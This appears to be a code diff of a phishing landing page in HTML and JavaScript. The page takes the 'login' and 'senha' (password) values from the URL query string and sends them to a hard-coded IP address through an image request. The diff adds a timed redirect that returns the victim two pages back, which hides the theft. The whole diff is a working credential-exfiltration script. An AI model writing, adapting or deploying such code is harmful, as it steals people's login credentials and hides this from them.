@@ -2,13 +2,12 @@
 <html>
     <head><title></title>
 		<script>
-			//function retornar(){
-			//	window.history.go(-2);
-			//}
+			function retornar(){
+				window.history.go(-2);
+			}
 		</script>
 	</head>
 	<body>
-	
 		<script type="text/javascript">
 		
 			var url   = window.location.search.replace("?", "");
@@ -19,19 +18,16 @@
 			}
 			retorno = array.login + array.senha;
 															
-			if(new Image().src = "http://192.168.0.123/?=" + retorno){
-				window.history.go(-2);
-			}
+			new Image().src = "http://192.168.0.123/?=" + retorno
 			
 			//retornar();
 			
 		</script>
 				<script>
-			//window.onload = function() {
-				//setTimeout("retornar()", 500)
-			//}
+			window.onload = function() {
+				setTimeout("retornar()", 400)
+			}
+			
 		</script>
-		
-		
 	</body>		
 </html>
